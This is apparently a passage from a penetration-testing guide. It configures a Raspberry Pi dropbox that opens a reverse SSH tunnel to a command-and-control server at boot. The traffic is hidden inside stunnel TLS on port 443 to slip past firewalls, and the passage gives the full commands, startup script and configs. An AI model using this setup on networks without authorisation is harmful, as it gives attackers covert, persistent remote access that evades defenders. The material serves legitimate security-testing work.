
```
root@pi:~# ssh-keygen -t rsa -b 4096
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa):
Created directory '/root/.ssh'.
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in /root/.ssh/id_rsa.
Your public key has been saved in /root/.ssh/id_rsa.pub.
The key fingerprint is:
SHA256:xiEe4YzdoGt8Rwnd6FVK pNF4xagQ2FrRBdwvEk/FoLA root@pi
The key's randomart image is:
+---[RSA 4096]----+
|    o*=..+0o    |
|   .*+B+.=**    |
|  ooE.+ =.+. .  |
|  .+ =000+.0    |
|  + + S.o.+     |
|   . o . .      |
|      .         |
|               |
|               |
+----[SHA256]----+
```

- 2. Log into the C&C server, and navigate to the root of the home directory. Create a .ssh directory if one does not exist.
- 3. Within this .ssh directory, copy the id_rsa.pub file that was just created from the inside server to the .ssh directory on the C&C server.
- 4. Once this is complete, it is time to test it. Log onto your inside server, in my case, the Raspberry Pi. Now, ssh to your C&C server. You should be asked whether you want to continue the first time so you can accept the key. After selecting yes, you should be logged in without being prompted for a password. Log out and try the SSH session again. You should be able to get right into the C&C server without any input:

```
root@kali:~# cd .ssh/
root@kali:~/.ssh# scp root@pi-kali:/root/.ssh/id_rsa.pub authorized_keys
The authenticity of host 'pi-kali (192.168.33.123)' can't be established.
ECDSA key fingerprint is SHA256:CQN3/+t/1Jtq4+E0W7WS5YLQAspDXQXewFqLFv6IKIA.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added 'pi-kali' (ECDSA) to the list of known hosts.
root@pi-kali's password:
id_rsa.pub
root@kali:~/.ssh# ls
authorized_keys  known_hosts
```

Now that we have the `ssh` tunnels built and working without any input, we want to work on hiding all this traffic within a TLS tunnel. There are lots of security devices that may filter SSH outbound or may raise some additional flags. Fortunately, SSL/TLS is typically allowed through firewalls, so having the traffic flow through a SSL/TLS tunnel would be an added bonus. Luckily, stunnel is a great utility to use for this purpose. Now, let me demonstrate how I can set up stunnel and get it working before we tie it all together. But before we get to stunnel, we have to make sure that our ssh connection will launch on startup so that we can reverse-ssh at any time:

- 1. First, let's navigate to the `if-up.d` directory. I will create a file in that directory that will execute on startup. I will call this file `outbound-ssh`, and make sure that its executable with the `-x` flag. Finally, I will edit the file. In my case, I will be using `vi`:
- 2. Then, I just need to create the script within the file that will execute:
- 3. There are lots of options in terms of how to get this script to run on boot. I insert the command in the `/etc/rc.local` so that it boots on startup. I just call the script as-is:

/root/outbound-ssh

```
root@pi-kali:~# cd /etc/network/if-up.d/
root@pi-kali:/etc/network/if-up.d# touch outbound-ssh
root@pi-kali:/etc/network/if-up.d# chmod +x outbound-ssh
root@pi-kali:/etc/network/if-up.d# vi outbound-ssh
```

```
#!/bin/sh

su -c "/usr/bin/ssh -p 8888 -f -N -R 8022:127.0.0.1:22 localhost"
```

## stunnel to the rescue

What stunnel is, basically is an application/utility that provides SSL/TLS-based tunnels. It allows us to specify what traffic we want to be tunneled over these SSL/TLS-based tunnels. This is the perfect solution for our needs. stunnel does involve setup on both sides to work, so let me show you how to configure both sides of the stunnel tunnel.

Setting up stunnel can be a little complicated the first time you go through it due to the mix of ports and IPs. You may need to diagram it out just to make sure that you have the correct port and IPs in the right location. Let me start with the C&C server, which will be our stunnel server. I am assuming stunnel is already installed, just not configured.

- 1. First, I need to set up the certificates for the encryption between the client and server. We will use `openssl` to generate the certificates and then combine them into a single `.PEM` file:

```
root@kali:~# openssl genrsa 2048 > /etc/stunnel/stunnel.key
Generating RSA private key, 2048 bit long modulus
............................................................................
............................................................................
+++
e is 65537 (0x10001)
root@kali:~# openssl req -new -key /etc/stunnel/stunnel.key -x509 -days 200 -out /etc/stunnel/stunnel.crt
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:US
State or Province Name (full name) [Some-State]:PA
Locality Name (eg, city) []:Pittsburgh
Organization Name (eg, company) [Internet Widgits Pty Ltd]:Pentest Services
Organizational Unit Name (eg, section) []:IT
Common Name (e.g. server FQDN or YOUR name) []:CCserver
Email Address []:test@pentest.com
root@kali:~# cat /etc/stunnel/stunnel.crt /etc/stunnel/stunnel.key > /etc/stunnel/stunnel.pem
```

2. Next, we will make sure that we enable stunnel:

![](img/095df2cd1930baecbcecaa51ee3417aa_72_0.png)

3. Configuring the stunnel configuration file is probably the hardest task in this entire step. There is not a whole lot of configuration we need to put in there; however, what we do put in there is some minimal requirements.

4. Within the configuration file, I need to make sure that stunnel knows this is the server and not the client. This is accomplished with the following parameter:

```
client = no
```

5. I also need to let stunnel know where the certificate resides within the cert parameter:

```
cert = /PATH/TO/CERT
```

6. Telling stunnel what server and port to listen on is very important. This needs to be set using the Accept parameter. In my case, this will be port 443 and the IP address of the interface we plan to use:

```
Accept = 192.168.33.27:443
```

7. Finally, the use of the Connect parameter will tell stunnel where to send the traffic:

```
Connect = 127.0.0.1:22
```

```
root@kali:/etc/stunnel# cat stunnel.conf
debug = debug
output = /var/log/stunnel.log
[ssh]
accept = 192.168.33.27:443
connect = 127.0.0.1:22
cert = /etc/stunnel/stunnel.pem
```

That is all the configuration that needs to be performed on the server side. Once the client side gets set up, we can test the whole process. Make sure that you restart the stunnel service on the C&C server to take the new settings:

```
service stunnel4 restart
```

If you are running a piece of firewall software on either the C&C server or the Raspberry Pi, you will need to make sure that you have the correct firewall holes open on the firewall for stunnel and the reverse SSH tunnel.

## stunnel setup on the client – Raspberry Pi

Setting up the client side of the stunnel tunnel is very easy. The hardest part again is understanding what to put in the Accept and Connect parameters. Again, I will assume that the stunnel package has already been installed on the Raspberry Pi.

- 1. Copy the `stunnel.pem` file from the C&C server over to the Raspberry Pi.
- 2. Edit the `stunnel.conf` file to reflect the accept and connect IP/Port information as well as letting stunnel know this is a client. This file should be located in `/etc/stunnel/stunnel.conf`. You want to make sure that you set the client to yes since the Pi will act as a client. The accept will be the localhost port you will connect to bring up the tunnel; in this case, this is the ssh session I specify in the startup script. The connect will be the other end of the stunnel tunnel on port 443, since we are using the SSL tunnel to hide this ssh traffic in:

```
root@pi-kali:~# cat /etc/stunnel/stunnel.conf
[ssh]
cert = /etc/stunnel/stunnel.pem
client = yes
accept = 127.0.0.1:8888
connect = 192.168.33.27:443
```
